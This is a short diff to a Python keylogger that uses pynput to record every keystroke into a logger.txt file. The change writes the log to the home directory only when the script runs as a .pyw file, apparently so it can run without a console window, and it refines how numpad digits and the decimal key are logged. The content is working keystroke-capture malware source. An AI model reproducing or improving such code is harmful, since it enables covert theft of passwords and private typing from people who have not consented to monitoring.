@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 import re
+import sys
 from pathlib import Path
 
 from pynput.keyboard import Listener
@@ -9,7 +10,10 @@ line_length = 0
 
 
 def key_recorder(key):
-    home = str(Path.home())
+    if '.pyw' in sys.argv[0]:
+        home = str(Path.home())
+    else:
+        home = ''
     f = open(os.path.join(home, 'logger.txt'), 'a+')
     keyo = str(key)
     global line_length
@@ -30,8 +34,13 @@ def key_recorder(key):
             f.write("")
     elif len(re.findall(r'(x[\d]+)', keyo)) > 0:
         f.write('')
-    elif len(re.findall(r'<([\d]+)>', keyo)) > 0:
-        f.write(str(int(re.findall(r'<([\d]+)>', keyo)[0]) - 96))
+    elif len(re.findall(r'<([\d]+)>', keyo)) > 0 :
+        if int(re.findall(r'<([\d]+)>', keyo)[0]) - 96 < 10:
+            f.write(str(int(re.findall(r'<([\d]+)>', keyo)[0]) - 96))
+        elif re.findall(r'<([\d]+)>', keyo)[0] == '110':
+            f.write('.')
+
+
     # elif keyo == "Key.alt_l" or keyo == "Key.tab":
     #     f.write('')
     # elif keyo == "Key.ctrl_l":
